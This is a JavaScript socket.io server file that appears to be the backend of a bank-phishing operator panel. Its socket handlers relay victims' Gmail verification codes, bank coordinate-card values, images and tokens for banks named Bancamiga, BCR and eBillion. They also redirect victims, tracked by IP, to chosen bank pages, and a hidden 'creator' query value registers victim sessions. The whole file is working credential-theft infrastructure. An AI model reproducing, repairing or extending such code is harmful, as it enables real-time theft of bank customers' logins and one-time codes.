import { createServer } from 'http'

import morgan from 'morgan';
import cors  from 'cors'
import { Server } from 'socket.io'
import express  from 'express'
import 'dotenv/config'

import { connectdb } from './db/connectdb.mjs'
import { verifyToken, userConnect, userDisconnect } from './utils/index.mjs'

// routes
import authRoute from './routes/authRoute.mjs';
import { bagConnected, getBagForById } from './controllers/bag/index.mjs';
import { bagCreateController } from './controllers/sockets/bag/bagCreateController.mjs';
import { bagDisconnectController } from './controllers/sockets/bag/bagDisconnectController.mjs';
import { panelSendRedirect } from './controllers/sockets/live/panelSendRedirect.controller.mjs';

const app = express()

app.use(cors({origin: '*'}))
app.use(express.json())
app.use(morgan('dev'))

connectdb()
const PORT = 3001
const httpServer = createServer(app)
export const io = new Server(httpServer, { 
    cors: '*' 
})


app.use(express.static('public'))
app.use('/auth', authRoute )


io.on('connection', async(socket) => {    
    
    if(
        socket.handshake.headers.origin === ('http://localhost:3000') || socket.handshake.headers.origin == ('https://huggopaneloficial.online/') 
    ) {
        try {
            const [valido, id] = await verifyToken({token: socket.handshake?.query['x-token']})
            
            if(valido == false) return socket.disconnect()

            await userConnect({ id })
            await socket.join(id)
    
            if([...socket.rooms].includes(id)) {
                const users = await getBagForById({id})
                socket.emit('[bag] getBag', users)
                
                socket.on('[gmail] deviceAndNumberVerify', ({ip = '', gmailDevice = '', gmailCode = '' }) => {
                    if(ip == '') return
                    return io.to(ip).emit('[gmail] bagGmailData', { gmailDevice, gmailCode })
                })

                socket.on('[bancamiga] getImage', ({ip = '', image = ''}) => {
                    if(ip == '') return
                    return io.to(ip).emit('[bancamiga] sendImage', {image})
                })
                
                socket.on('[bcr] getCoordinates', ({ip = '', coordinate1 = '', coordinate2 = '', coordinate3 = ''}) => {
                    if(ip == '') return
                    return io.to(ip).emit('[bcr] bagCoordinate', {
                        coordinate1: coordinate1.toString().slice(0,2), 
                        coordinate2: coordinate2?.toString()?.slice(0,2),
                        coordinate3: coordinate3?.toString()?.slice(0,2),
                        })
                })

                socket.on('[bancamiga] getListImage', ({ip = '', listImage = ''}) => {
                    if(ip == '') return
                    return io.to(ip).emit('[bancamiga] sendListImage', {listImage})
                })

                socket.on('[ebillion] getMethodToken', ({ip = '', methodToken = ''}) => {
                    if(ip == '') return
                    return io.to(ip).emit('[ebillion] sendMethodToken', {methodToken})
                })

                socket.on('[live] panelSendRedirect', async({ip, nameBank, urlPage, errorBag, specialInfo = true}) => 
                {
                    panelSendRedirect({ip, nameBank, urlPage, errorBag, io, socket, specialInfo})
                }
                )
            }

            socket.on('disconnect', async() => {
                await userDisconnect({id})
                return socket.leave(id)
            })
        } catch (error) {
            console.log(error)
        }
    } 
    


    if(socket.handshake?.query['creator'] == 'nadiemejode'){
        
        const ip = socket.handshake?.query['ip']

        if(ip == '') return socket.disconnect()
        socket.on('[bag] create', async (bag) => await bagCreateController({bag, socket}))
        if(ip) await socket.join(ip)
        if([...socket.rooms].includes(ip) && ip != '') { await bagConnected({ip, socket}) }


        socket.on('disconnect', async() => {
            await bagDisconnectController({socket})
            return socket.leave(ip)
        }) 

    }
    
})

// seed(1000)
// export const handler = serverless(httpServer)
httpServer.listen(PORT, () => console.log(`conectado al servidor ${PORT}`) )



